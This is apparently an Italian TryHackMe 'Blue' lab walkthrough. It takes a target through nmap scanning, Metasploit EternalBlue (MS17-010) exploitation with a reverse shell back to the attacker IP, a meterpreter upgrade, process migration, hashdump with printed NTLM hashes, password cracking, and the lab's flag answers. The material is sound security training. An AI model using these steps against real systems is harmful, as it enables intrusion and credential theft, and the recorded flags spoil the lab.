
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/blue

```
sudo openvpn ~/Downloads/dominion99.ovpn
```

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.85.132 -oG risultatoscan
```

```
sudo nmap -sC -sV -p135,139,445,3389 10.10.85.132 -oN risultatoscan2
```

```
nmap -O -A 10.10.85.132
```

==vulnerabilità con nmap script==
```
nmap -PN --script vuln -p135,139,445,3389 --script http-enum 10.10.85.132 -oN vuln.txt
```

vulnerabile a ms17-010 

```
searchsploit ms17-010
```

Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)          | windows/dos/41891.rb

```
msfconsole
```

```
search ms17-010
```

exploit/windows/smb/ms17_010_eternalblue

```
info 0
```

```
use 0
```

ora settiamo il remote host
```
set RHOST 10.10.85.132
```
poi settiamo il listening host con il nostro IP Attaccante
```
set LHOST 10.8.104.192
```
poi settiamo il listening port
```
set LPORT 445
```
poi settiamo il PAYLOAD (a titolo di apprendimento)

```
set PAYLOAD windows/x64/shell/reverse_tcp
```

```
show options
```

```
run
```

==e siamo dentro la macchina!==

==Importante Ctrl+Z== per passare in background la shell di windows e lavorare da metasploit

==ora prendiamo il modulo post esplotazione== converte a shell da meterpreter shell in metasploit

```
post/multi/manage/shell_to_meterpreter
```

```
set session 1
```

```
run
```

```
sessions
```
per vedere sessione creata nel id2 c'è meterpreter

```
sessions -i 2
```
digito da meterpreter> 
```
ps
```
vede tutti i processi attualmente attivi sulla macchina vittima (PID)

```
migrate 1348
```
per passare ad uno di questi processi
```
hashdump
```
per vedere le password salvate

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

ffb43f0de35be4d9917ac0cc8ad57f8d (hash password di Jon)

https://crackstation.net/

```
Oppure  utilizzare
hash-identifier
john --format=NT ---wordlist=hash.txt
```

```
alqfna22
```
password craccata

a caccia di flag!

```
pwd
```

Flag1? _This flag can be found at the system root._

```
cd /
```

```
cat flag1.txt
```

flag{access_the_machine}

Flag2? _This flag can be found at the location where passwords are stored within Windows._

```
cd windows/system32/config
```

```
cat flag2.txt
```
flag{sam_database_elevated_access}

flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

```
cd /Users/Jon/Documents
```

```
cat flag3.txt
```
flag{xxxxxxxxxxxxx}


